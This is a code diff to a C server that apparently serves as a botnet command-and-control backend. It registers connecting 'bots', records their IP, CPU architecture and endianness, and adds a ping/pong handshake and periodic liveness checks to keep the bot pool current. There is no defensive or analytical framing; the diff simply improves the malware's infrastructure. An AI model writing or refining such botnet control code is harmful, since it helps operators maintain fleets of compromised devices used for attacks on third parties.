@@ -14,6 +14,20 @@ pthread_mutex_t cooldown_mutex = PTHREAD_MUTEX_INITIALIZER;
 
 void* handle_bot(void* arg) {
     int bot_socket = *((int*)arg);
+    int bot_index = -1;
+    pthread_mutex_lock(&bot_mutex);
+    for(int i = 0; i < bot_count; i++) {
+        if(bots[i].socket == bot_socket) {
+            bot_index = i;
+            break;
+        }
+    }
+    pthread_mutex_unlock(&bot_mutex);
+    if(bot_index == -1) {
+        close(bot_socket);
+        free(arg);
+        return NULL;
+    }
     free(arg);
     char buffer[MAX_COMMAND_LENGTH] = {0};
     ssize_t len;
@@ -22,6 +36,14 @@ void* handle_bot(void* arg) {
         len = recv(bot_socket, buffer, sizeof(buffer) - 1, 0);
         if (len <= 0) break;
         buffer[len] = 0;
+        
+        if (strncmp(buffer, "ping", 4) == 0) {
+            char pong[64];
+            snprintf(pong, sizeof(pong), "pong %s", bots[bot_index].arch);
+            send(bot_socket, pong, strlen(pong), MSG_NOSIGNAL);
+            continue;
+        }
+        
         int valid = 1;
         for (ssize_t i = 0; i < len; i++) {
             if ((unsigned char)buffer[i] < 0x09 || ((unsigned char)buffer[i] > 0x0D && (unsigned char)buffer[i] < 0x20) || (unsigned char)buffer[i] > 0x7E) {
@@ -31,6 +53,9 @@ void* handle_bot(void* arg) {
         }
         if (!valid) break;
     }
+    pthread_mutex_lock(&bot_mutex);
+    bots[bot_index].is_valid = 0;
+    pthread_mutex_unlock(&bot_mutex);
     close(bot_socket);
     return NULL;
 }
@@ -62,86 +87,107 @@ void* bot_listener(void* arg) {
             free(bot_socket);
             continue;
         }
-        pthread_mutex_lock(&bot_mutex);
-        if (bot_count < MAX_BOTS) {
-            bots[bot_count].socket = *bot_socket;
-            bots[bot_count].address = client_addr;
-            bots[bot_count].is_valid = 1;
-            char archbuf[20] = {0};
+
+        char archbuf[64] = {0};
+        fd_set readfds;
+        struct timeval tv;
+        FD_ZERO(&readfds);
+        FD_SET(*bot_socket, &readfds);
+        tv.tv_sec = 2;
+        tv.tv_usec = 0;
+        
+        if (select(*bot_socket + 1, &readfds, NULL, NULL, &tv) > 0) {
             ssize_t archlen = recv(*bot_socket, archbuf, sizeof(archbuf)-1, MSG_DONTWAIT);
             if (archlen > 0) {
                 archbuf[archlen] = 0;
-                strncpy(bots[bot_count].arch, archbuf, sizeof(bots[bot_count].arch)-1);
-            } else {
-                strcpy(bots[bot_count].arch, "unknown");
-            }
-            char ipbuf[32];
-            inet_ntop(AF_INET, &client_addr.sin_addr, ipbuf, sizeof(ipbuf));
-            const char* endian = (htonl(0x12345678) == 0x12345678) ? "Big_Endian" : "Little_Endian";
-            int already_logged = 0;
-            for (int i = 0; i < bot_count; i++) {
-                char existing_ip[32];
-                inet_ntop(AF_INET, &bots[i].address.sin_addr, existing_ip, sizeof(existing_ip));
-                if (strcmp(existing_ip, ipbuf) == 0) {
-                    already_logged = 1;
-                    break;
+                pthread_mutex_lock(&bot_mutex);
+                if (bot_count < MAX_BOTS) {
+                    bots[bot_count].socket = *bot_socket;
+                    bots[bot_count].address = client_addr;
+                    bots[bot_count].is_valid = 1;
+                    strncpy(bots[bot_count].arch, archbuf, sizeof(bots[bot_count].arch)-1);
+                    bots[bot_count].arch[sizeof(bots[bot_count].arch)-1] = 0;
+                    
+                    send(*bot_socket, "ping", 4, MSG_NOSIGNAL);
+                    memset(archbuf, 0, sizeof(archbuf));
+                    
+                    FD_ZERO(&readfds);
+                    FD_SET(*bot_socket, &readfds);
+                    tv.tv_sec = 2;
+                    tv.tv_usec = 0;
+                    
+                    if (select(*bot_socket + 1, &readfds, NULL, NULL, &tv) > 0) {
+                        ssize_t ponglen = recv(*bot_socket, archbuf, sizeof(archbuf)-1, MSG_DONTWAIT);
+                        if (ponglen > 0 && strncmp(archbuf, "pong ", 5) == 0) {
+                            char ipbuf[32];
+                            inet_ntop(AF_INET, &client_addr.sin_addr, ipbuf, sizeof(ipbuf));
+                            const char* endian = (htonl(0x12345678) == 0x12345678) ? "Big_Endian" : "Little_Endian";
+                            char logarch[128];
+                            snprintf(logarch, sizeof(logarch), "Endian: %s | Architecture : %s", endian, bots[bot_count].arch);
+                            log_bot_join(logarch, ipbuf);
+                            bot_count++;
+                            pthread_mutex_unlock(&bot_mutex);
+                            pthread_t bot_thread;
+                            pthread_create(&bot_thread, NULL, handle_bot, bot_socket);
+                            pthread_detach(bot_thread);
+                            continue;
+                        }
+                    }
                 }
+                pthread_mutex_unlock(&bot_mutex);
             }
-            if (!already_logged) {
-                char logarch[128];
-                snprintf(logarch, sizeof(logarch), "Endian: %s | Architecture : %s", endian, bots[bot_count].arch);
-                log_bot_join(logarch, ipbuf);
-            }
-            bot_count++;
-        } else {
-            close(*bot_socket);
-            free(bot_socket);
-            pthread_mutex_unlock(&bot_mutex);
-            continue;
         }
-        pthread_mutex_unlock(&bot_mutex);
-        pthread_t bot_thread;
-        pthread_create(&bot_thread, NULL, handle_bot, bot_socket);
-        pthread_detach(bot_thread);
+        close(*bot_socket);
+        free(bot_socket);
     }
     close(bot_server_socket);
     return NULL;
 }
 
 void* ping_bots(void* arg) {
+    char pongbuf[64];
     while (1) {
         pthread_mutex_lock(&bot_mutex);
+        int current_pos = 0;
+        
         for (int i = 0; i < bot_count; i++) {
             if (!bots[i].is_valid) continue;
-            for (int j = i + 1; j < bot_count; j++) {
-                if (!bots[j].is_valid) continue;
-                if (bots[i].address.sin_addr.s_addr == bots[j].address.sin_addr.s_addr) {
-                    close(bots[i].socket);
-                    bots[i].is_valid = 0;
-                    break;
-                }
+            
+            int res = send(bots[i].socket, "ping", 4, MSG_NOSIGNAL);
+            if (res < 0) {
+                close(bots[i].socket);
+                bots[i].is_valid = 0;
+                continue;
             }
-        }
-
-        int current_pos = 0;
-        for (int i = 0; i < bot_count; i++) {
-            if (bots[i].is_valid) {
-                int res = send(bots[i].socket, "ping", 4, MSG_NOSIGNAL);
-                if (res < 0) {
-                    close(bots[i].socket);
-                    bots[i].is_valid = 0;
-                } else {
+            
+            fd_set readfds;
+            struct timeval tv;
+            FD_ZERO(&readfds);
+            FD_SET(bots[i].socket, &readfds);
+            tv.tv_sec = 2;
+            tv.tv_usec = 0;
+            memset(pongbuf, 0, sizeof(pongbuf));
+            
+            if (select(bots[i].socket + 1, &readfds, NULL, NULL, &tv) > 0) {
+                ssize_t ponglen = recv(bots[i].socket, pongbuf, sizeof(pongbuf)-1, MSG_DONTWAIT);
+                if (ponglen > 0 && strncmp(pongbuf, "pong ", 5) == 0) {
                     if (current_pos != i) {
                         bots[current_pos] = bots[i];
                     }
                     current_pos++;
+                } else {
+                    close(bots[i].socket);
+                    bots[i].is_valid = 0;
                 }
+            } else {
+                close(bots[i].socket);
+                bots[i].is_valid = 0;
             }
         }
         
         bot_count = current_pos;
         pthread_mutex_unlock(&bot_mutex);
-        sleep(10);
+        sleep(4);
     }
     return NULL;
 }
